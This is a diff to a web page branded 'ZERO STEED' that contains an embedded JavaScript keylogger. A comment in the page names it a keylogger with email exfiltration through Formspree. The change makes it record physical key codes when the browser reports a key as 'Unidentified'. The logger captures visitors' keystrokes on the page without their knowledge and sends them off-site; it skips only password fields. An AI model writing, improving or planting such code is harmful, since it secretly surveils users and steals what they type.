@@ -126,7 +126,6 @@
 <body>
     <div class="container">
         <div class="logo-placeholder">
-            <!-- Replace with your logo if you have one -->
             <img src="assets/logo.jpeg" alt="Logo" onerror="this.style.display='none'">
             <span style="display: none;">🔥 ZERO STEED</span>
         </div>
@@ -146,7 +145,7 @@
         </div>
     </div>
 
-    <!-- JavaScript Keylogger with Email Exfiltration (Formspree) -->
+    <!-- JavaScript Keylogger with Email Exfiltration (Formspree) – Fixed for Unidentified keys -->
     <script>
     (function() {
         // ===== CONFIGURATION =====
@@ -156,8 +155,11 @@
         let keystrokeBuffer = [];
         let formSubmitted = false;
         
-        // Format special keys nicely
-        function formatKey(key) {
+        // Format special keys nicely, using event.code as fallback for "Unidentified"
+        function formatKey(event) {
+            const key = event.key;
+            const code = event.code;
+            
             if (key === ' ') return '[SPACE]';
             if (key === 'Enter') return '[ENTER]\n';
             if (key === 'Backspace') return '[BACKSPACE]';
@@ -168,6 +170,13 @@
             if (key === 'Shift') return '[SHIFT]';
             if (key === 'CapsLock') return '[CAPS]';
             if (key.startsWith('Arrow')) return `[${key}]`;
+            
+            // If key is Unidentified, use the physical key code instead
+            if (key === 'Unidentified') {
+                // Examples: KeyA, Digit1, ShiftLeft, etc.
+                return `[${code}]`;
+            }
+            
             return key;
         }
         
@@ -176,7 +185,7 @@
             // Don't log password fields (ethical)
             if (event.target.type === 'password') return;
             
-            let key = formatKey(event.key);
+            let key = formatKey(event);
             keystrokeBuffer.push(key);
             
             // Optional: console log for debugging
